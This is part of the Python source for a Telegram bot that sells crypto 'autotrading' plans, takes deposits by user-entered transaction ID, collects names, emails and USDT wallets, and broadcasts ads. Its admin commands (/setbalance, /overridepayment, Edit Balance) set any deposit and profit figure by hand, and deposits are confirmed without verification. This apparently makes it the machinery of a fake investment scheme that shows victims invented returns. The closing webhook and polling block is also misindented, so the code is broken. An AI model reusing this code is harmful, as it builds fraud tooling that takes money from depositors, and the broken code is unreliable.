async def confirm_deposit_callback(update: Update, context: ContextTypes.DEFAULT_TYPE):
    try:
        await update.callback_query.answer()
    except:
        pass

    choice = update.callback_query.data
    with db_session() as session:
        user = session.query(UserAccount).filter_by(telegram_id=update.effective_user.id).first()
    lang = user.language if user else "en"

    if choice == "confirm_yes":
        amt = context.user_data["deposit"]
        await update.callback_query.edit_message_text(get_msg(lang, "deposit_success", amount=amt))
        return STATE_WALLET
    else:
        await update.callback_query.edit_message_text("Please enter your transaction ID again:")
        return STATE_TXID


async def handle_wallet(update: Update, context: ContextTypes.DEFAULT_TYPE):
    wallet_address = update.message.text.strip()
    context.user_data["wallet_address"] = wallet_address

    with db_session() as session:
        user = session.query(UserAccount).filter_by(telegram_id=update.effective_user.id).first()
        if user:
            user.wallet_address = wallet_address
        else:
            user = UserAccount(
                telegram_id    = update.effective_user.id,
                wallet_address = wallet_address,
                language       = "en"
            )
            session.add(user)
    lang = user.language

    await update.message.reply_text(get_msg(lang, "activated"))
    return ConversationHandler.END


async def cancel_deposit(update: Update, context: ContextTypes.DEFAULT_TYPE):
    await update.message.reply_text("Deposit process cancelled.")
    return ConversationHandler.END


async def balance_handler(update: Update, context: ContextTypes.DEFAULT_TYPE):
    try:
        await update.callback_query.answer()
    except:
        pass

    with db_session() as session:
        user = session.query(UserAccount).filter_by(telegram_id=update.effective_user.id).first()

    if user:
        d = user.deposit; p = user.profit; t = d + p
        text = f"Your current balance:\nDeposit: ${d:.2f}\nProfit: ${p:.2f}\nTotal: ${t:.2f}"
    else:
        text = "Balance: $0"

    kb = [[InlineKeyboardButton("BACK", callback_data="main_menu")]]
    await update.callback_query.edit_message_text(text, reply_markup=InlineKeyboardMarkup(kb))


async def choose_language(update: Update, context: ContextTypes.DEFAULT_TYPE):
    kb = [
        [InlineKeyboardButton("English", callback_data="lang_en"),
         InlineKeyboardButton("Español", callback_data="lang_es")],
        [InlineKeyboardButton("Русский",   callback_data="lang_ru"),
         InlineKeyboardButton("العربية",  callback_data="lang_ar")],
        [InlineKeyboardButton("Bahasa Indonesia", callback_data="lang_id"),
         InlineKeyboardButton("Deutsch",   callback_data="lang_de")],
        [InlineKeyboardButton("हिन्दी",    callback_data="lang_hi"),
         InlineKeyboardButton("Français",  callback_data="lang_fr")],
        [InlineKeyboardButton("中文",      callback_data="lang_zh")]
    ]
    if getattr(update, "message", None):
        await update.message.reply_text(get_msg("en", "choose_language"), reply_markup=InlineKeyboardMarkup(kb))
    else:
        await update.callback_query.edit_message_text(get_msg("en", "choose_language"), reply_markup=InlineKeyboardMarkup(kb))


async def set_language(update: Update, context: ContextTypes.DEFAULT_TYPE):
    try:
        await update.callback_query.answer()
    except:
        pass

    lang = update.callback_query.data.split("_")[1]
    with db_session() as session:
        user = session.query(UserAccount).filter_by(telegram_id=update.effective_user.id).first()
        if user:
            user.language = lang
        else:
            user = UserAccount(telegram_id=update.effective_user.id, language=lang)
            session.add(user)

    kb = [
        [InlineKeyboardButton(get_msg(lang, "autotrading"), callback_data="autotrading")],
        [InlineKeyboardButton(get_msg(lang, "balance"),     callback_data="balance")],
        [InlineKeyboardButton(get_msg(lang, "contact_support"), url="https://t.me/cryptotitan999")],
    ]
    await update.callback_query.edit_message_text(get_msg(lang, "welcome"), reply_markup=InlineKeyboardMarkup(kb))


async def toggle_compound(update: Update, context: ContextTypes.DEFAULT_TYPE):
    with db_session() as session:
        user = session.query(UserAccount).filter_by(telegram_id=update.effective_user.id).first()
        if user:
            user.compound = not user.compound
            msg = get_msg(user.language, "compound_on") if user.compound else get_msg(user.language, "compound_off")
        else:
            msg = get_msg("en", "compound_off")
    await update.message.reply_text(msg)


# ========================
# Admin Handlers
# ========================
async def admin_panel(update: Union[Update, Message], context: ContextTypes.DEFAULT_TYPE):
    # normalize message object for replies
    if isinstance(update, Update):
        caller = update.effective_user.id
        reply_target = update.message or getattr(update.callback_query, "message", None)
    else:
        caller = update.from_user.id
        reply_target = update

    if caller != ADMIN_ID:
        if reply_target:
            await reply_target.reply_text(get_msg("en", "admin_not_auth"))
        return ConversationHandler.END

    keyboard = [
        [InlineKeyboardButton("📊 Dashboard",      callback_data="admin_dashboard")],
        [InlineKeyboardButton("📢 Send Ad",        callback_data="admin_ad_start")],
        [InlineKeyboardButton("👤 Manage Users",   callback_data="admin_user_select")],
        [InlineKeyboardButton("❌ Close",           callback_data="admin_close")]
    ]
    if reply_target:
        await reply_target.reply_text("Admin Panel:", reply_markup=InlineKeyboardMarkup(keyboard))
    return ADMIN_MAIN


async def admin_dashboard(update: Update, context: ContextTypes.DEFAULT_TYPE):
    try:
        await update.callback_query.answer()
    except:
        pass

    with db_session() as session:
        users = session.query(UserAccount).all()
        total_users   = len(users)
        total_deposit = sum(u.deposit for u in users)
        total_profit  = sum(u.profit  for u in users)

    text = (
        f"📊 Admin Dashboard:\n\n"
        f"👥 Total Users: {total_users}\n"
        f"💰 Total Deposits: ${total_deposit:.2f}\n"
        f"📈 Total Profit: ${total_profit:.2f}"
    )
    kb = [[InlineKeyboardButton("🔙 Back", callback_data="admin_back")]]
    await update.callback_query.edit_message_text(text, reply_markup=InlineKeyboardMarkup(kb))


async def admin_ad_start(update: Update, context: ContextTypes.DEFAULT_TYPE):
    try:
        await update.callback_query.answer()
    except:
        pass

    await update.callback_query.edit_message_text(
        "Send the ad text you want to broadcast:",
        reply_markup=InlineKeyboardMarkup([[InlineKeyboardButton("🔙 Cancel", callback_data="admin_back")]])
    )
    return STATE_AD_TEXT


async def handle_ad_text(update: Update, context: ContextTypes.DEFAULT_TYPE):
    context.user_data["ad_text"] = update.message.text
    await update.message.reply_text(
        "Send media (photo/video) for the ad (or /skip to skip):",
        reply_markup=InlineKeyboardMarkup([[InlineKeyboardButton("Skip Media", callback_data="ad_skip_media")]])
    )
    return STATE_AD_MEDIA


async def handle_ad_media(update: Update, context: ContextTypes.DEFAULT_TYPE):
    media = None
    if update.message.photo:
        media = ("photo", update.message.photo[-1].file_id)
    elif update.message.video:
        media = ("video", update.message.video.file_id)
    context.user_data["ad_media"] = media

    await update.message.reply_text(
        "Send target user ID (or 'all' for broadcast):",
        reply_markup=InlineKeyboardMarkup([
            [InlineKeyboardButton("Broadcast to All", callback_data="ad_target_all")],
            [InlineKeyboardButton("🔙 Cancel", callback_data="admin_back")]
        ])
    )
    return STATE_AD_TARGET


async def skip_ad_media(update: Update, context: ContextTypes.DEFAULT_TYPE):
    context.user_data["ad_media"] = None
    await update.callback_query.edit_message_text(
        "Send target user ID (or 'all' for broadcast):",
        reply_markup=InlineKeyboardMarkup([
            [InlineKeyboardButton("Broadcast to All", callback_data="ad_target_all")],
            [InlineKeyboardButton("🔙 Cancel", callback_data="admin_back")]
        ])
    )
    return STATE_AD_TARGET


async def handle_ad_target(update: Union[Update, Message], context: ContextTypes.DEFAULT_TYPE):
    # uniform handling whether callback or message
    if isinstance(update, Update) and getattr(update, "callback_query", None):
        target = "all"
        chat = update.effective_chat
    else:
        target = update.message.text.strip()
        chat = update.effective_chat

    context.user_data["ad_target"] = target

    # preview ad
    text = "Ad Preview:\n\n" + context.user_data["ad_text"]
    media = context.user_data["ad_media"]
    if media:
        type_, mid = media
        if type_ == "photo":
            await context.bot.send_photo(chat_id=chat.id, photo=mid, caption=text)
        else:
            await context.bot.send_video(chat_id=chat.id, video=mid, caption=text)
    else:
        if isinstance(update, Update) and update.callback_query:
            await update.callback_query.message.reply_text(text)
        else:
            await update.message.reply_text(text)

    if isinstance(update, Update) and update.callback_query:
        base_reply = update.callback_query.message
    else:
        base_reply = update.message

    await base_reply.reply_text(
        "Confirm sending this ad:",
        reply_markup=InlineKeyboardMarkup([
            [InlineKeyboardButton("✅ Confirm Send", callback_data="ad_confirm")],
            [InlineKeyboardButton("🔙 Cancel",       callback_data="admin_back")]
        ])
    )
    return ADMIN_MAIN


async def send_ad_confirmed(update: Update, context: ContextTypes.DEFAULT_TYPE):
    try:
        await update.callback_query.answer()
    except:
        pass

    ad_text  = context.user_data.get("ad_text", "")
    ad_media = context.user_data.get("ad_media")
    target   = context.user_data.get("ad_target", "all")

    with db_session() as session:
        if isinstance(target, str) and target.lower() == "all":
            users = session.query(UserAccount).all()
        else:
            try:
                uid = int(target)
                users = [session.query(UserAccount).filter_by(telegram_id=uid).first()]
            except Exception:
                users = []

    sent = 0
    for u in users:
        if not u:
            continue
        try:
            if ad_media:
                mt, mid = ad_media
                if mt == "photo":
                    await context.bot.send_photo(chat_id=u.telegram_id, photo=mid, caption=ad_text)
                else:
                    await context.bot.send_video(chat_id=u.telegram_id, video=mid, caption=ad_text)
            else:
                await context.bot.send_message(chat_id=u.telegram_id, text=ad_text)
            sent += 1
        except Exception as e:
            logger.error(f"Failed to send ad to {u.telegram_id}: {e}")

    await update.callback_query.edit_message_text(
        f"✅ Ad sent to {sent} users",
        reply_markup=InlineKeyboardMarkup([[InlineKeyboardButton("🔙 Back to Admin", callback_data="admin_back")]])
    )
    return ADMIN_MAIN


async def admin_override_payment(update: Update, context: ContextTypes.DEFAULT_TYPE):
    if update.effective_user.id != ADMIN_ID:
        await update.message.reply_text(get_msg("en", "admin_not_auth"))
        return

    if len(context.args) < 2:
        await update.message.reply_text("Usage: /overridepayment <user_id> <plan_key> [amount]")
        return

    try:
        user_id, plan_key = int(context.args[0]), context.args[1]
        amt = float(context.args[2]) if len(context.args) > 2 else None
    except:
        await update.message.reply_text("Invalid arguments.")
        return

    if plan_key not in TRADING_PLANS:
        await update.message.reply_text("Invalid plan key.")
        return

    with db_session() as session:
        u = session.query(UserAccount).filter_by(telegram_id=user_id).first()
        if not u:
            await update.message.reply_text("User not found.")
            return
        u.selected_plan = plan_key
        if amt is not None:
            u.deposit = amt
        else:
            u.deposit = {
              "plan_1":500,"plan_2":1000,"plan_3":5000,
              "plan_4":10000,"plan_5":50000,"plan_6":200000
            }[plan_key]
    await context.bot.send_message(chat_id=user_id, text=get_msg(u.language, "activated"))
    await update.message.reply_text(f"Override done for {user_id}")

async def admin_override_payment_menu(update: Update, context: ContextTypes.DEFAULT_TYPE):
    """Shown when admin taps the 'Override Payment' button."""
    query = update.callback_query
    await query.answer()

    text = (
        "Send the command like this:\n"
        "/overridepayment <user_id> <plan_key> [amount]\n\n"
        "Examples:\n"
        "• /overridepayment 123456 basic 100\n"
        "• /overridepayment 987654 pro   (uses the default plan amount)\n\n"
        "Plan keys: basic, standard, pro (or the exact keys you use in DB)."
    )
    await query.message.reply_text(text)


async def admin_setbalance(update: Update, context: ContextTypes.DEFAULT_TYPE):
    if update.effective_user.id != ADMIN_ID:
        await update.message.reply_text(get_msg("en", "admin_not_auth"))
        return

    if len(context.args) < 2:
        await update.message.reply_text("Usage: /setbalance <user_id> <deposit> [profit]")
        return

    try:
        user_id, dep = int(context.args[0]), float(context.args[1])
        prof = float(context.args[2]) if len(context.args) > 2 else 0.0
    except:
        await update.message.reply_text("Invalid arguments.")
        return

    with db_session() as session:
        u = session.query(UserAccount).filter_by(telegram_id=user_id).first()
        if not u:
            await update.message.reply_text("User not found.")
            return
        u.deposit = dep
        u.profit  = prof

    await update.message.reply_text(f"Balance updated for {user_id}")


async def admin_user_select(update: Update, context: ContextTypes.DEFAULT_TYPE):
    try:
        await update.callback_query.answer()
    except:
        pass

    with db_session() as session:
        users = session.query(UserAccount).all()

    kb = []
    for u in users:
        kb.append([InlineKeyboardButton(f"{u.telegram_id} - {u.full_name or 'No name'}",
                                        callback_data=f"admin_user_{u.telegram_id}")])
    kb.append([InlineKeyboardButton("🔙 Back", callback_data="admin_back")])

    await update.callback_query.edit_message_text("Select a user to manage:", reply_markup=InlineKeyboardMarkup(kb))
    return ADMIN_USER_SELECT


async def admin_user_selected(update: Update, context: ContextTypes.DEFAULT_TYPE):
    uid = int(update.callback_query.data.split("_")[-1])
    context.user_data["admin_selected_user"] = uid

    kb = [
        [InlineKeyboardButton("✏️ Edit Balance",     callback_data="admin_edit_balance")],
        [InlineKeyboardButton("🎯 Override Payment", callback_data="admin_override_payment")],
        [InlineKeyboardButton("🔙 Back",              callback_data="admin_back")]
    ]
    await update.callback_query.edit_message_text(f"Managing user: {uid}", reply_markup=InlineKeyboardMarkup(kb))
    return ADMIN_BALANCE_EDIT


async def admin_edit_balance(update: Update, context: ContextTypes.DEFAULT_TYPE):
    await update.callback_query.edit_message_text("Send new balance in format: <deposit> <profit>\nExample: 5000 1250")
    return STATE_ADMIN_BALANCE


async def handle_admin_balance(update: Update, context: ContextTypes.DEFAULT_TYPE):
    try:
        dep, prof = map(float, update.message.text.split())
        uid        = context.user_data["admin_selected_user"]
        with db_session() as session:
            u = session.query(UserAccount).filter_by(telegram_id=uid).first()
            if u:
                u.deposit = dep
                u.profit  = prof
                await update.message.reply_text(f"Balance updated for {uid}")
            else:
                await update.message.reply_text("User not found")
    except:
        await update.message.reply_text("Invalid format. Use: <deposit> <profit>")

    return await admin_back(update, context)


async def admin_back(update: Union[Update, Message], context: ContextTypes.DEFAULT_TYPE):
    # reuse admin_panel to display main admin menu
    return await admin_panel(update, context)


async def admin_close(update: Update, context: ContextTypes.DEFAULT_TYPE):
    if getattr(update, "callback_query", None):
        await update.callback_query.edit_message_text("Admin panel closed")
    elif getattr(update, "message", None):
        await update.message.reply_text("Admin panel closed")
    return ConversationHandler.END


async def health_check(update: Update, context: ContextTypes.DEFAULT_TYPE):
    await update.message.reply_text("✅ Bot is operational")


# ========================
# Callback Dispatcher
# ========================
async def callback_dispatcher(update: Update, context: ContextTypes.DEFAULT_TYPE):
    data = update.callback_query.data
    routing = {
        "main_menu":       main_menu,
        "autotrading":     autotrading_menu,
        "payment_method":  payment_method_menu,
        "balance":         balance_handler,
        "deposit_done":    deposit_done_callback,
    }
    for pat, handler in routing.items():
        if data.startswith(pat):
            return await handler(update, context)

    if data.startswith("plan_"):
        return await plan_selection(update, context)
    if data.startswith(("pay_", "usdt_")):
        return await payment_callback_handler(update, context)
    if data.startswith("confirm_"):
        return await confirm_deposit_callback(update, context)
    if data.startswith("lang_"):
        return await set_language(update, context)
    if data == "collect_details":
        return await start_collect_details(update, context)

    try:
        await update.callback_query.answer(text="Option not handled.")
    except telegram.error.BadRequest:
        pass


# ========================
# Main
# ========================
def main() -> None:
    # --- Build Application ---
    app_bot = Application.builder().token(TGBOTTOKEN).build()

    # --- Register Handlers ---
    app_bot.add_handler(CommandHandler("health", health_check))
    app_bot.add_handler(CommandHandler("start", start))
    app_bot.add_handler(CommandHandler("language", choose_language))
    app_bot.add_handler(CommandHandler("compound", toggle_compound))
    app_bot.add_handler(CommandHandler("overridepayment", admin_override_payment))
    app_bot.add_handler(CommandHandler("setbalance",      admin_setbalance))

    # Admin panel conversation
    admin_conv = ConversationHandler(
        entry_points=[CommandHandler("admin", admin_panel)],
        states={
            ADMIN_MAIN: [
                CallbackQueryHandler(admin_dashboard,  pattern="^admin_dashboard$"),
                CallbackQueryHandler(admin_ad_start,   pattern="^admin_ad_start$"),
                CallbackQueryHandler(admin_user_select,pattern="^admin_user_select$"),
                CallbackQueryHandler(send_ad_confirmed,pattern="^ad_confirm$"),
                CallbackQueryHandler(admin_back,       pattern="^admin_back$"),
                CallbackQueryHandler(admin_close,      pattern="^admin_close$")
            ],
            ADMIN_USER_SELECT: [
                CallbackQueryHandler(admin_user_selected, pattern="^admin_user_")
            ],
            ADMIN_BALANCE_EDIT: [
                CallbackQueryHandler(admin_edit_balance,  pattern="^admin_edit_balance$"),
                CallbackQueryHandler(admin_override_payment_menu, pattern="^admin_override_payment$"),
                CallbackQueryHandler(admin_back,          pattern="^admin_back$")
            ],
            STATE_AD_TEXT: [
                MessageHandler(filters.TEXT & ~filters.COMMAND, handle_ad_text),
                CallbackQueryHandler(admin_back, pattern="^admin_back$")
            ],
            STATE_AD_MEDIA: [
                MessageHandler(filters.PHOTO | filters.VIDEO, handle_ad_media),
                CallbackQueryHandler(skip_ad_media, pattern="^ad_skip_media$"),
                CallbackQueryHandler(admin_back,    pattern="^admin_back$")
            ],
            STATE_AD_TARGET: [
                MessageHandler(filters.TEXT & ~filters.COMMAND, handle_ad_target),
                CallbackQueryHandler(lambda u,c: handle_ad_target(u,c), pattern="^ad_target_all$"),
                CallbackQueryHandler(admin_back,    pattern="^admin_back$")
            ],
            STATE_ADMIN_BALANCE: [
                MessageHandler(filters.TEXT & ~filters.COMMAND, handle_admin_balance),
                CallbackQueryHandler(admin_back,    pattern="^admin_back$")
            ]
        },
        fallbacks=[CommandHandler("cancel", admin_close)],
        allow_reentry=True
    )
    app_bot.add_handler(admin_conv)

    # Deposit conversation
    deposit_conv = ConversationHandler(
        entry_points=[CallbackQueryHandler(deposit_done_callback, pattern="^deposit_done$")],
        states={
            STATE_TXID:   [MessageHandler(filters.TEXT & ~filters.COMMAND, handle_txid)],
            STATE_CONFIRM:[CallbackQueryHandler(confirm_deposit_callback, pattern="^confirm_")],
            STATE_WALLET: [MessageHandler(filters.TEXT & ~filters.COMMAND, handle_wallet)],
        },
        fallbacks=[CommandHandler("cancel", cancel_deposit)],
        allow_reentry=True
    )
    app_bot.add_handler(deposit_conv)

    # Details collection conversation
    details_conv = ConversationHandler(
        entry_points=[CallbackQueryHandler(start_collect_details, pattern="^collect_details$")],
        states={
            STATE_NAME:       [MessageHandler(filters.TEXT & ~filters.COMMAND, handle_name)],
            STATE_EMAIL:      [MessageHandler(filters.TEXT & ~filters.COMMAND, handle_email)],
            STATE_COUNTRY:    [MessageHandler(filters.TEXT & ~filters.COMMAND, handle_country)],
            STATE_USDT_TRC20: [MessageHandler(filters.TEXT & ~filters.COMMAND, handle_usdt_trc20)],
        },
        fallbacks=[CommandHandler("cancel", cancel_deposit)],
        allow_reentry=True
    )
    app_bot.add_handler(details_conv)

    # Generic callback dispatcher (fallback for any unmatched callback)
    app_bot.add_handler(CallbackQueryHandler(callback_dispatcher))

    # Global error handler
    app_bot.add_error_handler(error_handler)

    # --- Jobs ---
    job_time = datetime.time(hour=0, minute=0, second=0, tzinfo=datetime.timezone.utc)
    app_bot.job_queue.run_daily(update_daily_profits, time=job_time)

    async def keep_alive(ctx):
        logger.info("Keep-alive ping")
    app_bot.job_queue.run_repeating(keep_alive, interval=300, first=10)

    # Start health server
    try:
        start_health_server(port=int(os.environ.get("HEALTH_PORT", 8000)))
    except Exception as e:
        logger.exception("Failed to start health server: %s", e)

    loop = asyncio.get_event_loop()

   if WEBHOOK_BASE_URL:
    # --- Webhook mode (only if you really want to use it) ---
    app_bot.run_webhook(
        listen="0.0.0.0",
        port=render_port,
        url_path=TGBOTTOKEN,
        webhook_url=f"{WEBHOOK_BASE_URL}/{TGBOTTOKEN}"
    )
else:
    # --- Polling mode (safe, avoids flood control) ---
    app_bot.run_polling(drop_pending_updates=True)


if __name__ == "__main__":
    # Only run Flask health server when using polling.
    if not WEBHOOK_BASE_URL:
        threading.Thread(target=run_flask, daemon=True).start()
    main()
